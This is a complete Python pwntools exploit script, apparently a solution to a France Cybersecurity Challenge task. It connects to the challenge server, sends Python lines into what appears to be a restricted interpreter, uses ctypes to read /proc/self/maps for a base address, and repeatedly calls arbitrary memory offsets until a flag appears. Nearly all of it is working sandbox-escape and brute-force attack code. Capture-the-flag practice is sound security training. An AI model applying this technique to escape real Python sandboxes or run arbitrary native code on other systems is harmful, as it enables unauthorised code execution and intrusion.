#!/usr/bin/python

from pwn import *

commands = """c = __import__('ctypes')
o = __import__('sys').modules['codecs'].open
ptr = c.CFUNCTYPE(c.c_void_p)
res = o('/proc/self/maps').read()
base = int(res[6417:6417+12],16)""".splitlines()

context.log_level = 'error'

while True:
	for i in range(0x120, 0x130):
		r = remote('challenges1.france-cybersecurity-challenge.fr', 4005)

		r.recv()

		for c in commands:
			r.sendline(c)
			r.recv()

		r.sendline("f = ptr(base+"+hex(i)+")")
		r.recv()
		r.sendline("f()")
		try:
			res = r.recv()
			if "super flag" in res: 
				print(hex(i), res)
		except:
			pass
		r.close()